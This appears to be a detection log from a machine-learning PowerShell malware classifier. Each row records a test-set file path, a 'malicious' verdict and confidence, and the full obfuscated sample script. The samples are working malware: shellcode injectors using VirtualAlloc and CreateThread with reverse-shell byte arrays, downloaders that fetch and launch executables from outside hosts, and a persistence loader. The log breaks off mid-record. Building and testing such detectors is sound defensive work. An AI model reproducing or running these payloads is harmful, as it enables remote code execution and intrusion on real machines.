lpThreadAtt',',0x','xfb,0x83,0x76,0x5c,0xaa,0x98,0x20,0x7','81,0xed,0x60,0x12,0x10,0x24,0xb9,0xdb,0xbf,0x09,0x76,0x2e,0xc1,0x4e,0xb0,0xd1,0','0x7b,0xad,0x40,0x6d,0x29,0x46,0xd3,0x03','uRTx=uRTw::VirtualAll',',0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0xdb,0xd2,0xf9,0x6e,0x0b,0x90,0x02,0x8f,0xcb,0xf',',0x30,0x0c,0x92,0xda,0xc5,0xd9,0x74,0x24,0xf4,0x5e,0x31,0')).REplACE(([cHar]117+[cHar]82+[cHar]84),[STRInG][cHar]36).REplACE('ier',[STRInG][cHar]34).REplACE('ngv',[STRInG][cHar]39) )",malicious,TP
2026-07-13 16:46:34,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1530.ps1,custom-ps-ml,UNKNOWN,433b5447-f609-4b56-8627-518e9a7f5fa1,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2812,1616.45,"((\""{19}{33}{0}{3}{5}{30}{4}{25}{10}{26}{15}{40}{31}{23}{41}{22}{14}{46}{45}{8}{28}{6}{35}{36}{2}{43}{13}{39}{11}{34}{38}{7}{12}{42}{24}{32}{9}{20}{21}{16}{27}{44}{17}{1}{29}{18}{37}\"" -f'e',');qm8i++) {qm8w::memset([IntPtr](qm8x.ToInt32()+qm8i),',',0x8b','xtern IntPtr VirtualAlloc(IntPtr lpAddress, uin','2.dllM0v)]public s','t dwSize, uint flAllocationType, uint flPro',',0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0','0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0x','d2,0',',0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,','ess, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThread','xd6,0x31,0','d0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x0',',0x8b,0x48,',',','tPtr memset(IntPtr dest, uint src',' qm8z.Length};qm8x=qm8w::VirtualAlloc(0,0x','40);for (qm8i=0;qm8i -le (qm8z.Length-1',',0,qm8x,0,0,0);for (;;){Start-s','qm','0x5f,0xff,0xd5,0x8b,0x36,0x6a,','0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;qm8g = 0x1000;if (qm8z.Length -gt 0x1000){qm8g =','yte[]]qm8z = 0xfc,0xe8','Add-Type -memberDefinition qm8c -Name M0vWin32M0v -namespace Win32Functions -passthr','x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x01,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0','tatic extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddr','Id);[DllImport(M0vmsvcrt.dllM0v)]public static extern In','1','x64,0x8b,0x52,0x30,0x8b',' qm8z[qm8i], 1)};qm8w::CreateThread(0','tect);[DllImport(M0vkernel3',' = ','x10,0x56,0x57','8c = IWc[DllImport(M0vkernel32.dllM0v)]public static ','xf','xf0,0x52,0x57,0x8b,0x52,0x10,0x8b',',0x42,0x3c,0x01,0xd0','leep 60};','f,0x31,0xc0,0xac,0xc1,0xcf,','0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0',', uint count);IWc;qm8w','u;[Byte[]];[B','0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0',',0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50','000,qm8g,0x','89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0x','0x')).repLACe(([cHar]73+[cHar]87+[cHar]99),[stRiNG][cHar]39).repLACe(([cHar]77+[cHar]48+[cHar]118),[stRiNG][cHar]34).repLACe(([cHar]113+[cHar]109+[cHar]56),'$')|.( $Shellid[1]+$ShELlId[13]+'X')",malicious,TP
2026-07-13 16:46:47,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1532.ps1,custom-ps-ml,UNKNOWN,1e3a9b00-6e13-4421-a13f-59818d7575f7,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2890,1820.4,"(((\""{26}{29}{31}{13}{19}{18}{11}{47}{7}{38}{37}{40}{44}{20}{0}{1}{24}{6}{21}{2}{33}{4}{8}{48}{12}{41}{16}{34}{27}{25}{46}{42}{14}{10}{5}{32}{23}{45}{43}{39}{17}{30}{28}{3}{15}{35}{9}{22}{36}\""-f'p','e -memberDefinition Dpxc -Name jsrWin32jsr -namespace Win','0,0xda,0xd4,0xd9,0x74,0','7b,0xb6,0xf2,0x0d,0xc4,0xa0,0xfa,0xc1,0xc4,0x30,0xad,0x8b,0xc4,0x58,0x09,0xe8,0x96,0x7d,0x56,0x25,0x8b,0x2e,0xc3,0xc6,0xfa,0x83,0x44,0xaf,0','0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xee,0x6e,0x0a,0xcf,0xec,0x66,0x','0x10,0x87,0x27,0xf1,0xcd,0x2d,0x23,0x1f,0x19,0x5c,0x6e,0x77,0xee,0x6d,0x91,0x87,0x78,0xe5,0xe2,','passthru;[Byte[]];[Byte[]]Dpxz = 0xba,0x92','nt dwCreationFlags, IntPtr lpT','49,0x30,0x0d,0x76,0x2e','pxg = 0x1000;if (Dpxz.Length -gt 0x1000){Dpxg = Dpxz.Length};Dpxx=Dpxw::VirtualAlloc(0,0x1000,Dpxg,0x40);for (Dpxi=0;Dpxi -le (Dpxz.Length-1);Dpxi++) {Dpxw::memse','3,0xe0,0x8b,0xc1,0x42,0x24,0x4d,0x81,0x48,0x81,0x19,0xcd,0x4c,0x14,0xcd,0x65,0x68,0x9d,0xf0,0xa9,0xf9,0xe5,0xd6,0x6d,0xa2,0xbe,0x77,0x37,0x0e,','read(IntPtr lpThreadAttributes, uint dwStackSi',',0xba,0x4b,0x77,0x44,0x38,0x96,0xa4,0xa6,0x01','ocationType, uint flProtect)','b','x00,0xfa,0xa3,0x70,0xfa,0x29,0x32',',0x84,0x30,0xf5,0x1f,0xc2,0xe7,0xea,0x14,0x9e,','5b,0x4d,0xd7,0x11,0x1c,0x3d,0xbf,0x7b,0x93,0x62,0xdf,0x83,0x79,0x0b,0x75,0x6c,0xd4,0x63,0xe1,0x15,0x7d,0xff,0x90,0xda,0xab,0x85,0x92,0x51,0x58,0x79,0x5c,0x92,0x15,0x69,0x08,0x52,0x60,','lljsr)]public static extern IntPtr CreateTh',';[DllImport(jsrkernel32.d','int src, uint count);jBm;Dpxw = Add-Ty',',0xe8,0x3a,0x1','t([IntPtr](Dpxx.ToInt32()+Dpxi), Dpxz[Dpxi], 1)};Dpxw::Create','d,0x6d,0xf5,0xa0,0x7b,0x6a,0xfa,0x9a,0x3c,0xe4,0x05,0x25,0x3d,0x2c,0xc1,0x71,0x6d,0x46,0xe0,0xf9,0xe6,0x96,0x0d,0x2c,0x92,0x93,0x99,0xea,0x7f,0x06,0x95,0x9','32Functions -','d1,0xef,0xc0,0x0b,0x0a,0x9a,0x38,','Dpxc = jBm[DllImport(jsrkernel32.dlljsr)]public static extern IntPtr Virtua','ad,0xca,0x9a,0x00,0xe4,0xd4,0xff,0x2d,0xbe,0x6f,0xcb,0xda,0x41,0xa6,0x02,0x22,0xed,0x87,0xab,0x','0x7e,0x1e,0xf8,0x65,0x29,0x49,0x94,0x67,0x0c,0xbd,0x3b,0x97,0x','lAlloc(IntPtr lpAddress, ','0xd3,0x9e,0x6d,0x5e,','uint dwSize, uint flAll','0xb5,0x27,0x5','x24,0xf4,','0x3b,0x80,0x66,0x0e,0x3c,0x75,0x3e,0x31,0x6d,0x28,0x35,0x68,0x',',0x4c,0x2d,0x17,0x40,0xbc,0xed;D','Thread(0,0,Dpxx,0,0,0);for (;;){Start-sleep 60};','sr','hreadId);[DllImport(j','x','msv',',0x59,0xb9,0xa7,0x46','3,0x2b,0xe5,0x','0x17,0xa1,0','crt.dlljsr)]public static extern IntPtr memset(IntPtr dest, u','d,0x7d,0x36,0x07,0xcd,0x0b,0xd0,','0x68,0xb7,0x9d,0xfe,0x13,0x6','ze, IntPtr lpStartAddress, IntPtr lpParameter, ui',',0xb8,0xe8,0x47,0x6e,0xde,0x79,0xf7,0x5e,0x94,0x2c,0xfb,0x15,0xf8,0xc4,0x88,0x58,0xd5,0xeb,0x39,0xd6,0x03,0xc5'))  -replAcE'jsr',[CHaR]34 -replAcE ([CHaR]68+[CHaR]112+[CHaR]120),[CHaR]36-replAcE ([CHaR]106+[CHaR]66+[CHaR]109),[CHaR]39) | &amp; ( $ShElLiD[1]+$sHellID[13]+'X')",malicious,TP
2026-07-13 16:46:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1579.ps1,custom-ps-ml,UNKNOWN,8609ce63-af1b-4f54-a3ad-8f3e5d072754,DESKTOP-BAC9DBQ,malicious,0.9784,RandomForest,543,1577.13,".((GET-vaRIaBLE '*mDr*').nAmE[3,11,2]-joIn'') ((((\""{16}{0}{32}{9}{10}{4}{24}{31}{21}{38}{2}{30}{26}{15}{23}{35}{28}{40}{14}{19}{17}{18}{3}{5}{36}{34}{27}{1}{25}{20}{6}{22}{13}{41}{29}{11}{8}{37}{12}{33}{7}{39}\""-f 'e','env:T','m','/p1/Pa_001','b','.exe','}P','3}','{1}env:TEM','-','O','3}','}Pa_001','001.exe{','le({0','Web','(N','l.','tk','}http://niki','P{2','st','a_','Cl','je','EM','Net.','1}','nload','cess ({','.','ct Sy','w','.exe{','{','ient).Dow','{0},{3}','P{2','e',')','Fi','3});Start-Pro'))-F [CHAr]39,[CHAr]36,[CHAr]92,[CHAr]34))",malicious,TP
2026-07-13 16:47:05,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1585.ps1,custom-ps-ml,UNKNOWN,c90acaa3-cd4b-4ad1-bdeb-b1d033bc4ca4,DESKTOP-BAC9DBQ,malicious,0.9848,RandomForest,410,1643.1," (((\""{10}{25}{8}{3}{23}{15}{7}{17}{20}{6}{4}{1}{22}{24}{14}{11}{5}{12}{13}{16}{9}{18}{2}{19}{21}{0}\"" -f'rocess HKtmess.exeHKt','tps://1','K','Net','oadFile(HKtht','yf','wnl','Cli','stem.','.ex','(New-Object S','0','HK','t,HKtm','shjhm','Web','ess','ent','eH','t);',').Do','Start-P','fichier','.','.com/?hf','y'))-cRePLace([cHAR]72+[cHAR]75+[cHAR]116),[cHAR]39)| . ((geT-VaRIaBle '*MdR*').NaME[3,11,2]-JOiN'')",malicious,TP
2026-07-13 16:47:20,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1588.ps1,custom-ps-ml,UNKNOWN,310f4491-b954-4129-a94b-9574affcd289,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2802,1668.42," ((\""{32}{29}{2}{15}{35}{45}{9}{1}{28}{0}{24}{18}{41}{44}{37}{3}{10}{21}{27}{20}{46}{40}{30}{14}{16}{5}{42}{22}{19}{23}{43}{12}{6}{8}{4}{7}{13}{17}{11}{36}{34}{33}{25}{26}{31}{39}{38}\"" -f 'emberDefinition LNcc -Name 4HcWin324Hc -namespace Win32Functions -passthru;[Byte[]];[Byte[]]LNcz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x','rn IntPtr memset(IntPtr dest, uint src, uint count);','tPtr ','b,0x','7,0x','7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24','0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbf,0x35,0x1c,0x4e,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0','68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x1','x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x5','atic exte','48,','4,0x53,0xe5,0xff,',',0x68,0xea,0x0f,0xdf,','0,','0xe0,0x75,0xf4,0x03,0x7d','VirtualAlloc(IntPtr lpAddress, u',',0xf8,0x3b,0x','0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa','c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4','ff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d','c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31','0x18','x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0x',',0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,','31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0','9,0xc6,0x85,0xf6,0x75,0xec,0xc3;LNcg = 0x1000;i','f (LNcz.Length -gt 0x1000){LNcg = LNcz.Length};LNcx=LNcw::Virtual',',0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3','mc9;LNcw = Add-Type -m','= mc9[DllImport(4Hckernel32.dll4Hc)]public static extern In','xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,','Alloc(0,0x1000,LNcg,0x40);for (LNci=0;LNci','LNcc ','0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x2','x57,0x68,0x02,0xd9,','int dwSize, uint flAllocationType, uint flProtect);[DllImport(4Hckernel32.dll4Hc)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPt','0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0',',0x01,0xd0,0x50,0x8','sleep 60};',' -le (LNcz.Length-1);LNci++) {LNcw::memset([IntPtr](LNcx.ToInt32()+LNci), LNcz[LNci], 1)};LNcw::CreateThread(0,0,LNcx,0,0,0);for (;;){Start-','xff,0x31,0','2,0x3c,0x01,0xd0,0x',',0x01,0xd3,0x66,0','0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50','8b,0x40,0x78,0x85,0xc0,0x74,0x4a','r lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(4Hcmsvcrt.dll4Hc)]public st',',0')).ReplACE(([ChAr]76+[ChAr]78+[ChAr]99),'$').ReplACE(([ChAr]52+[ChAr]72+[ChAr]99),[sTRiNG][ChAr]34).ReplACE('mc9',[sTRiNG][ChAr]39) |.((GEt-VaRIabLE '*MdR*').namE[3,11,2]-JoIN'')",malicious,TP
2026-07-13 16:47:31,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1590.ps1,custom-ps-ml,UNKNOWN,3b1f18b5-de8d-4f72-a087-c099467e1f2d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2832,1786.6," ((\""{9}{40}{39}{29}{36}{5}{44}{25}{4}{34}{15}{37}{6}{12}{46}{11}{1}{8}{43}{20}{41}{31}{10}{19}{24}{14}{13}{21}{2}{7}{16}{33}{30}{35}{18}{0}{26}{38}{27}{3}{45}{28}{17}{32}{42}{22}{23}\"" -f'5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x','x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61','0xcf,0x0d,0x01,0xc7,0x38,0x','0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbd,0xae','ThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uin','uint flAllocationType,',' src, uint count);Tt5;SWjw = Add-Type -memberDefinition SWjc -Name brdWin32brd -namespace Win32Functions -passthru;[Byte','e0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,',',0','SWjc = Tt5[D','0x57,0x8b,0x52,0x','0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0','[]];[Byte[]]S','0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50','2,0x3c,0x01,0xd0,0x8b,',')]public static extern IntPtr memse','0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0',',0xd','9,0x5a,0x51,0xff,0xe0,0x58,0x','10,','x',',0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,','3,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0','xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;SWjg = 0x1000;if (SWjz.Length -gt 0x1000){SWjg = SWjz.Length};SWjx=SWjw::VirtualAlloc(0,0x1000,SWjg,0x40);for (SWji=0;SWji -le (SWjz.Length-1);SWji++) {SWjw::memset([IntPtr](SWjx.ToInt32()+SWji), SWjz[SWji], 1)};SWjw::CreateThread(0,0,SWjx,0,0,0);for (;;){Start-sleep 60};','0x8b,0x4','DllImport(brdkernel32.dllbrd)]public static extern IntPtr CreateThread(IntPtr lp','00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5','0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,','0xa5,0x74,0x61,0xff','irtual','x44,0x24,0x24','xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,','5,0x85,0xc0,0x','x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0','t dwCreationFlags, IntPtr lpThreadId);[DllImport(brdmsvcrt.dllbrd',',0x5b,0x5b,0x61,0x5','Alloc(IntPtr lpAddress, uint dwSize, ','t(IntPtr dest, uint',',',')]public static extern IntPtr V','llImport(brdkernel32.dllbrd','20,0','74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x5','x7c,0x02,0x2c,0',' uint flProtect);[',',0x61,0xf3,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,','Wjz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,')).ReplacE(([CHAr]98+[CHAr]114+[CHAr]100),[STRinG][CHAr]34).ReplacE(([CHAr]83+[CHAr]87+[CHAr]106),[STRinG][CHAr]36).ReplacE(([CHAr]84+[CHAr]116+[CHAr]53),[STRinG][CHAr]39)| &amp;( $eNV:cOMspEC[4,24,25]-joIN'')",malicious,TP
2026-07-13 16:47:36,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1602.ps1,custom-ps-ml,UNKNOWN,925fa795-fc5b-4222-8174-258368b6b7ce,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2979,1566.81,".( ([STRing]$VErbOsEPreFEreNcE)[1,3]+'X'-jOIn'')((((\""{59}{56}{13}{36}{61}{38}{23}{34}{17}{41}{53}{18}{0}{24}{46}{35}{52}{55}{5}{6}{10}{43}{32}{25}{50}{67}{49}{22}{9}{66}{48}{21}{64}{2}{15}{30}{58}{47}{65}{42}{44}{45}{51}{26}{14}{69}{1}{39}{3}{33}{28}{60}{68}{19}{57}{27}{37}{63}{11}{62}{20}{29}{31}{4}{54}{40}{16}{7}{12}{8}\""-f ' = Add-Type -memberD','0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0','0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03','5,0x6a,0x00,0x6a','(','te[]',']Hslz = 0xfc,0xe8,0x89,0','slz[Hsli], 1)};Hslw:','ateThread(0,0,Hsl8wer,0,0,0);for (;;){Start-sleep 60};','x','x00,0x00,0x00,0x60','lg = Hslz.Length};Hsl8wer=H',':Cre','.dllx5g)]publi','01,0xbb,0x8',',0x7d,0xf8,0x3b,0x7d,0x24,0x75','et([IntPtr](Hsl8wer.ToInt32()+Hsli), H',' ','tr memset(IntPtr dest, uint src, uint count);gRt;Hslw','x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x','loc(0,0x1000,Hslg,','50,0x8b,0x48,0x18,0x8','0','.dllx5g)]public static extern IntPtr CreateThread(IntPtr','efinition Hsl0ab -','0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c','0,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x54,0x0b,0x20,0x68,0x02,0x00,0x','8,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0','0x04,0x56,0x57,','0x40);for',',0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x',' ','0x89,0xe5,0x31,0xd2,',',',' lpThreadAttributes, uint','2x5g -namespac','c static extern IntPtr VirtualAlloc(Int','xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;Hslg = 0x1000;if (Hslz.Length -gt ',';[DllImport(x5gkernel32','x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd','0;Hsli -le (Hslz.Length-1);Hsli++) {Hslw::mems','dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThre','x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29',',',',0x80,0x6b,0x00,0xff,','0xd5,0','Name x5gWin3','xeb,0','01,0xd0,0x','b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,',',0x20,0xc1,0xcf,0x0d,0x01,0xc7,','x50,0x50,0x5','e W','adId);[DllImport(x5gmsvcrt.dllx5g)]public static extern IntP','Hsli=','in32Functions -passthru;[Byte[]];[By','t(x5gkernel32','57,0x6','0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0','Hsl0ab = gRt[DllImpor','0x68,0x0','Ptr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)','slw::VirtualAl','0x1000){Hs','b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,','x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0','85,0xc0,0x74,0x4a,0x','0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8','2,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0','9,0xe6,0x6a,0x10,0x56,0x57,0x68,')) -CRepLAce  ([chAR]103+[chAR]82+[chAR]116),[chAR]39  -CRepLAce ([chAR]120+[chAR]53+[chAR]103),[chAR]34  -CRepLAce  'Hsl',[chAR]36))",malicious,TP
2026-07-13 16:47:42,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1604.ps1,custom-ps-ml,UNKNOWN,2f99ed08-4ce8-4fcb-92fb-871a8cd78a4c,DESKTOP-BAC9DBQ,malicious,0.9546,RandomForest,3619,1847.1," . ( $SHELLID[1]+$shellId[13]+'x') ( ((\""{43}{0}{15}{29}{47}{38}{40}{58}{24}{57}{39}{27}{52}{21}{51}{26}{17}{35}{45}{23}{13}{55}{49}{28}{8}{22}{36}{50}{14}{30}{46}{3}{41}{44}{7}{42}{20}{31}{32}{11}{10}{34}{48}{12}{16}{18}{53}{6}{19}{9}{1}{56}{4}{54}{2}{5}{37}{33}{25}\""-f 'e = MUYSilentlyContinueMUY;MUYJlnlMUY;MUYrXrPGggbMUY',' System.Net.WebProxy(le6localhost:8123le6);MUYA','php?s=setup&amp;mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&amp;uid=MUY + jpdby;MUYzlMUY;MUYrIIvBbyFnMUY;while(!jpdnrcb){jpdn','+MUY.zipMUY;MUYDJlrBBZSMUY;MUYHlBZMUY;jpdilua=New','Y;jpdqdax.useDefaultCredentials = jpdtrue;M','rcb=jpd','xy=localhost:9','UY;if (!(Test-Path jpdvtzg) -or !(Test-Path jpdot)){;MUYcxjBOmZvDkMUY;MUYNInnMUY;e MUYi.vankin.deMUY','UYfAXKjauMUY;MUYkEXxMUY;jpdvpjq = New-Item -ItemType Directory -For','-wi Hidden;MUYcfrwPcMUY;MUYDlnzyvwBYQMUY;sleep 7;MUYTAtSCyMUY;MUYNgTiMUY;jpdqdax=New-Object','gMUY;MUYLUPqMUY;MUYgKQgLmYhMU','lo','le(!(jpdbimy -match MUYBoot','YVtMUY;MUYblWvxEYdBMUY;jpdezpr = jpdenv:APPDATA','MUYEKFMMUY;};MUYsBMUY;MUYRRiIYzMUY;MUYbvcCeTeLWMUY;',';jpdby = (get-wmiobject Win32_C','strapped ','tems();MUYDVRZCMXnMUY;MUYaVMuAymCDoMUY;jpdxyu.NameSpace(jpdezpr).CopyHere(jpdws, 20);MUYNoYaTMgWVMUY;MUYWczlafFHIMU','100%: Done.MUY));MUYMDNhoZxEMUY;MUYGuMuzoCwTMUY;saps jpd','050le6 ','Y;MUYtLVWuMUY;MUYDGZInswjMUY;MUY','CgMsMUY;jpdw','ce -P','YGFeZKeMyMUY;MU','Y','UY;','qvt).I','lookup -querytype=txt jpdohd 8.',';if (!(Test-Path jpdezpr)){;M','omputerSy','MUYNcOTYolCIBMUY;jpdvtzg=jpdezpr+ MUYNWctor.exeMUY;MUYRoqsuXEMUY;MUYfQGBWGwtMUY;jpdot=jpdezpr+ MUYN','ieaqBnXXBLMUY;if (!(Test-Path jpdvtzg) -or !(Test-Path jpdot)){;MUYTgaMUY;MUYrUFQiMUY;e MU','Ygg.ibiz.ccMUY;MUYLVSqdsMUY;MUYMkiSQLVJyMUY;};MUYsFUMwRQjMUY;MUYDZMUY;MUYdbMUY;MUYNmVXjZaOMUY;jpdcvdz=jpdezpr+MUYNWcroaming','pdnrcb;MUYoDMUY;MUYJqEesDpgbIMUY;};MUYYsGjzbNbhIwM','Y;saps jpdvtzg -Ar le6 --Log FZPle6','Y;rd jpdbqvt;MUYAJcMUY;M','ath jpdezpr;MUYGWSbAMUY;MUYvOvraMUY;jpdvpjq','ilua.downloadString(jpdpbtx)};MUYVWMMUY;MUYUAqSMUY;if (jpdnrcb -ne MUYnoneMUY){;MUYyyeYfmxpssMUY;MUYeTMUY;iex j','softNWcWindowsNWcCurrentVersionNWcRun) -match jpdby){;MUYBrOZYLFVYMUY;','Y;jpdmtk = (((iex le6ns','MUYih','-Object System.Net.WebClient;MUYQDcpyMUY;MUYQJxfMUY;jpdxyu=New-Object -C 